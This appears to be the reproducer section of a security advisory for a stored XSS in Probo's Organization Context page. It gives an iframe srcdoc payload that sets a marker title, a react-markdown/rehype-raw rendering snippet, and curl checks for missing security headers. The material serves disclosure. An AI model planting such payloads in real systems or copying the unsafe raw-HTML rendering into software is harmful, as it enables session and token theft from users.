# Reproducer

Stored XSS: the "exploit" is the stored value itself. As an OWNER/ADMIN, set the Organization
Context to:

```html
<iframe srcdoc="<script>document.title='XSS_MARKER'</script>"></iframe>
```

Then open the Organization Context page as any member with read access (VIEWER, AUDITOR, ADMIN,
OWNER). On `< 0.257.0` the document title changes, proving same-origin script execution in the
viewer's authenticated session. A real attacker would exfiltrate the session/CSRF token instead.

To confirm the sink in isolation, without a Probo instance, render the payload through the same
plugin set the component uses:

```js
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeRaw from 'rehype-raw';
// renderToStaticMarkup(<ReactMarkdown remarkPlugins={[remarkGfm]} rehypePlugins={[rehypeRaw]}>
//   {payload}</ReactMarkdown>)
// -> the <iframe> and its srcDoc attribute survive intact
```

Verify the missing header with `curl -I https://<console>/` on an affected build: no
`Content-Security-Policy` and no `X-Frame-Options` are returned, while `curl -I https://<console>/api/…`
does carry `default-src 'self'`.
